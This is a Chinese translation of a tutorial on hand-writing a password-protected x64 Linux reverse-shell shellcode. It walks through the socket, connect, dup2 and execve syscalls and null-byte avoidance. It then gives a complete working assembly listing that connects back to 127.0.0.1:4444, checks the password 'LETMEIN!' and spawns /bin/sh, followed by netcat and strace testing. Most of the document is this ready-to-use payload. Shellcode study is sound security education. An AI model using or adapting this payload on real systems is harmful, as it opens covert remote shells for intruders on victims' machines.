
# [翻译]编写带密码保护的反向 Shell

# 编写带密码保护的反向 Shell

---

> 译者注：

> 首先，在阅读正文前，先来了解一下“反向 Shell”的概念。

> 反向 Shell，即从内部网络主动连接到外部主机，从而绕过网络防火请的封锁，建立远程连接。

> 下面的示意图或能更形象地表示：

>

> ![reverse shell](upload/attach/202001/747320\_QFMW3FRJWV6NTD2.jpg)

>

> 解了 ?

---

## 1.概况

首先，明确一下我们的目的：我们的目标是编写一个运行在 Linux x64 下的 shellcode，它能通过 TCP/IPv4 反向连接至远程主机；同时，远控端只有输入有效的密码，才能启用该 shell。

为了编写一个常规的反向 shell，我们需要调用一系列系统调用。具体的步骤如下（密码授权认证将在稍后叙述）：

1. 利用`socket` 系统调用创建新的 socket 来管理新的连接。

2. 使用`connect` 系统调用连接至目的地址。

3. 使用`dup2` 系统调用来复制每个标准 stream 流到新的连接中，从而使远控端可以与受控端收发信息。

4. 最后通过`execve`系统调用来开启 shell。

上述的每一系统调用都有唯一的标识，所以，特定的寄存器必须存储特定的值。例如，`rax`寄存器用来区分执行的系统调用，所以它存储的是系统调用号。完整的系统调用表，请参考该 <a href="elink@038K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2M7X3y4Z5j5i4m8E0j5h3&6Q4x3X3g2G2M7X3N6Q4x3V1k6H3L8%4y4@1M7#2)9J5c8V1I4A6L8Y4g2^5i4K6g2X3f1%4W2K6N6r3g2E0i4K6g2X3b7$3q4D9L8q4)9#2k6W2c8S2j5X3I4W2i4K6g2X3k6X3!0J5i4K6g2X3P5o6R3$3i4K6g2X3y4U0c8Q4x3V1j5`.">文档</a>。

![pic\_02\_we are not writing HTML! ](upload/attach/202002/747320\_K7GDBZJP7GD6NN7.jpg "No, we are not writing HTML!—Photo by Markus Spiske on Unsplash")

## 2.编写系统调用

我们来看一下编写系统调用的一些例子。

### 2.1 简单的系统调用：`socket`（`0x29`）

```=assambly
48c7c029000000 mov rax,0x29 ; socket 系统调用号
48c7c702000000 mov rdi,0x02 ; 0x02 对应 IPv4
4831f6 xor rsi,rsi
48ffc6 inc rsi ; 0x01 对应 TCP
31d2 xor edx,edx ; 0 指代协议簇
0f05 syscall ; 执行系统调用
```

这段代码存在一些问题。首先，是代码太长（足足 48 字节）。其次，包含太多的空字节（null bytes）。

接下来，我们来解决这两个问题！

### 2.2 更切实可行的实现：`socket`（`0x29`）

下面的代码只有 12 字节长（为上述代码的 1/4）并且不含空字节：

```=assambly
6a29 push 0x29
58 pop rax ; 0x29 赋值给 rax ，无空字节（nullbytes）
6a02 push 0x02
5f pop rdi ; rdi 同理
6a01 push 0x01
5e pop rsi ; rsi 同理
99 cdq ; 仅用 1 个字节长的指令，将 rdx 置 0
0f05 syscall
```

为了实现反向 shell，我们所用到的系统调用，都要以这种方式编写。

![pic\_03](upload/attach/202001/747320\_64ETAH42Y5D74F4.jpg "Photo by Bartosz Kwitkowski on Unsplash")

## 3.密码认证

为了实现密码认证功能，我们需要读取客户端的文件描述符，并将用户输入与密码比较，然后执行 shell。代码框架如下：

```=assambly
; 6 - 处理接入连接
; 6.1 - 保存 client fd （客户端文件描述符） 并关闭 parent fd （母文件描述符）
mov r9, rax ; 将 client socket fd 存入 r9
; 此处并非是必需的，可注释掉以节省空间
push syscalls.close
pop rax ; 关闭 parent
syscall
; 6.2 - 从 client fd 读取密码
read\_pass:
xor rax, rax ; read syscall == 0x00
mov rdi, r9 ; from client fd
push 4
pop rdx ; rdx = input size
sub rsp, rdx
mov rsi, rsp ; rsi => buffer
syscall
; 6.3 - 核验密码
mov rax, config.password
mov rdi, rsi
scasq
jne read\_pass
```

基本流程是，我们从 client 端的文件描述符读取用户输入的密码，将该输入与给定的密码比对，重复该过程直到密码正确。

![pic\_04](upload/attach/202001/747320\_5PMSE72MJ9EA6EM.jpg "Photo by Christian Wiediger on Unsplash")

## 4.编写反向 Shell

基于我们前面准备的知识，现在我们要把这一系列系统调用串起来，组合成反向 TCP shell。下面是具体实现的例子，代码注释详细地阐述了每一块的功能：

```=assambly
; =================================================
; 密码保护的 x64 TCP 反向 Shell
; Author: Alan Vivona
; =================================================
global \_start
; 系统调用号（Syscall numbers）
syscalls.socket equ 0x29
syscalls.bind equ 0x31
syscalls.listen equ 0x32
syscalls.connect equ 0x2a
syscalls.accept equ 0x2b
syscalls.close equ 0x03
syscalls.dup2 equ 0x21
syscalls.write equ 0x01
syscalls.read equ 0x00
syscalls.execve equ 0x3b
; 常量定义
ipv4 equ 0x02 ; AF\_INET
ipv4.addressLen equ 0x10
tcp equ 0x01 ; SOCK\_STREAM
; 标准流（Standard streams）
standardIO.in equ 0x00
standardIO.out equ 0x01
standardIO.err equ 0x02
;:> echo -n '//bin/sh' | rev | xxd
;: 00000000: 6873 2f6e 6962 2f2f hs/nib//
binshString equ 0x68732f6e69622f2f
; 配置（Configs）
config.max\_cons equ 0x2
config.password equ 0x4d54454c214e4945 ; MTEL!NIE > LETMEIN!
config.target equ 0x100007f5c110002 ; tcp://127.0.0.1:4444
; This has nullbytes, so I replaced it with its complement
config.target.complement equ 0xfeffff80a3eefffe ; neg(tcp://127.0.0.1:4444)
section .text
\_start:
; 1 - 创建 socket
push syscalls.socket
pop rax
cdq
push ipv4
pop rdi
push tcp
pop rsi
syscall
mov r15, rax ; save fd into r15
; 2 - 连接至目标主机
xchg rax, rdi
mov rcx, config.target.complement
neg rcx
push rcx
mov rsi, rsp
push ipv4.addressLen
pop rdx
push syscalls.connect
pop rax
syscall
; 3 - 从 client fd 读取密码
read\_pass:
xor rax, rax ; read syscall == 0x00
mov rdi, r15 ; rdi = fd
push 0x04
pop rdx ; rdx = input size
sub rsp, rdx
mov rsi, rsp ; rsi => buffer
syscall
; Check password
mov rax, config.password
mov rdi, rsi
scasq
jne read\_pass
; 4 - 镜像 std 流（std streams）
mov rdi, r15 ; restore socket fd into rdi
push 0x02
pop rsi
loop\_through\_stdfs:
push syscalls.dup2
pop rax
syscall
dec rsi
jns loop\_through\_stdfs
; 5 - 执行（Execve）
xor rdx, rdx
push rdx ; push 第一个 NULL 字节
mov rbx, binshString ; push /bin//sh in reverse
push rbx ; 保存 /bin//sh 地址到 RDI
mov rdi, rsp
push rdx ; push 第二个 NULL 字节
mov rdx, rsp
push rdi ; 设置 RSI 为 /bin//sh 的地址
mov rsi, rsp
push syscalls.execve
pop rax
syscall
```

![pic\_05](upload/attach/202001/747320\_3D5DFU844UEWFSA.jpg "Photo by Mathew Schwartz on Unsplash")

## 5.测试

我们通过汇编、链接和运行等步骤，测试该 shellcode 是否正常工作。我也开发了一些定制化脚本来自动化地<a href="elink@20fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6S2L8r3q4F1N6X3W2$3L8$3&6S2i4K6u0r3M7s2N6F1M7$3S2G2M7q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6#2N6r3W2D9M7#2)9J5c8X3q4K6L8g2)9J5k6r3q4F1k6q4)9J5k6r3I4A6L8X3D9`.">汇编连接</a>、<a href="elink@aceK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6S2L8r3q4F1N6X3W2$3L8$3&6S2i4K6u0r3M7s2N6F1M7$3S2G2M7q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6#2N6r3W2D9M7#2)9J5c8X3!0T1K9U0u0K6K9r3g2D9L8r3y4G2k6r3f1`.">提取shellcode</a>以及<a href="elink@7d1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6S2L8r3q4F1N6X3W2$3L8$3&6S2i4K6u0r3M7s2N6F1M7$3S2G2M7q4)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6#2N6r3W2D9M7#2)9J5c8X3N6W2L8W2)9J5k6s2y4Z5k6h3I4D9j5$3!0V1k6g2)9J5k6s2c8W2M7%4b7`.">生成测试架构</a>。

为了测试，我们需要类似 `netcat` 的工具监听 4444 端口，启动 shellcode，`netcat` 将会反向连接回服务端。请看例子：

![Reverse TCP shell authentication](upload/attach/202002/747320\_VNS3QNUWEKXXGRZ.jpg)

我们可以用`strace` 来验证和 Debug 这些系统调用。在下面的小短片可以看到，首先运行的是`socket`和`connect` 组合，接下来是重复的 `read` 系统调用，最后输入正确密码后的 3 次 `dup2` 以及 `execve` 。

![Reverse TCP shell authentication with strace](upload/attach/202001/747320\_MVD4XNW94ATGH3R.jpg)

---

原文：<a href="elink@db4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2U0L8$3#2Q4x3V1k6K6P5i4y4U0j5h3I4D9y4e0W2Q4x3V1k6%4M7X3W2@1K9h3&6Y4i4K6u0V1j5g2)9J5k6s2m8S2M7%4y4%4L8%4u0V1i4K6u0V1M7s2u0G2N6r3g2U0N6r3g2V1i4K6u0V1M7X3g2$3k6i4u0K6k6g2)9J5k6s2y4Z5k6h3I4D9i4K6u0V1L8r3W2F1N6i4S2Q4x3X3c8^5y4U0c8Q4x3X3b7#2k6U0c8V1x3$3p5J5z5r3b7&6x3h3p5`."><mark class="encrypted">8f9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2U0L8$3#2Q4x3V1k6K6P5i4y4U0j5h3I4D9y4e0W2Q4x3V1k6%4M7X3W2@1K9h3&6Y4i4K6u0V1j5g2)9J5k6s2m8S2M7%4y4%4L8%4u0V1i4K6u0V1M7s2u0G2N6r3g2U0N6r3g2V1i4K6u0V1M7X3g2$3k6i4u0K6k6g2)9J5k6s2y4Z5k6h3I4D9i4K6u0V1L8r3W2F1N6i4S2Q4x3X3c8^5y4U0c8Q4x3X3b7#2k6U0c8V1x3$3p5J5z5r3b7&6x3h3p5`.</mark></a>

本文略有删改，并非按照原文逐字翻译！

翻译：看雪翻译小组 <a href="elink@0bbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5i4y4K6M7r3!0J5N6q4)9J5k6h3E0S2L8Y4S2#2k6g2)9J5k6h3y4G2L8g2)9J5c8Y4g2K6k6i4u0Q4x3X3c8U0k6h3&6@1k6i4u0Q4x3X3b7%4y4o6M7K6x3U0m8Q4x3X3g2Z5N6r3@1`.">StrokMitream</a>

校对：看雪翻译小组 <a href="elink@349K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5i4y4K6M7r3!0J5N6q4)9J5k6h3E0S2L8Y4S2#2k6g2)9J5k6h3y4G2L8g2)9J5c8Y4g2K6k6i4u0Q4x3X3c8U0k6h3&6@1k6i4u0Q4x3X3b7%4z5o6M7^5z5o6u0Q4x3X3g2Z5N6r3@1`.">lordVice</a>

## 参考
